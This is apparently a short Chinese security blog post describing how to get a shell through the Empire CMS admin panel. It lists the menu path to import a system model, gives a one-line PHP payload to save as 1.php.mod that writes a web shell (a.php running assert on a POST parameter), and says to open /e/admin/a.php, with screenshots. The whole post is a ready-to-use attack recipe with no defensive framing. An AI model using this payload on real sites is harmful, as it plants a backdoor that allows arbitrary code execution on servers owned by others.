---
title: "帝国 cms 后台 getshell"
date: 2018-04-12T00:00:00+08:00
draft: false
tags: ["cms"]
categories: ["web"]
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

帝国 cms 后台 getshell

<!--more-->

系统- 数据库与系统模型 - 管理数据表 - 管理系统模型

![20220701151939](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220701151939.png)

本地新建 1.php.mod 内容

`<?fputs(fopen("a.php","w"),"<?php assert(\$_POST[a]);?>")?>`

导入系统模型 - 选择文件 - 马上导入

![20220701152006](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220701152006.png)

访问 /e/admin/a.php

![20220701152042](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220701152042.png)

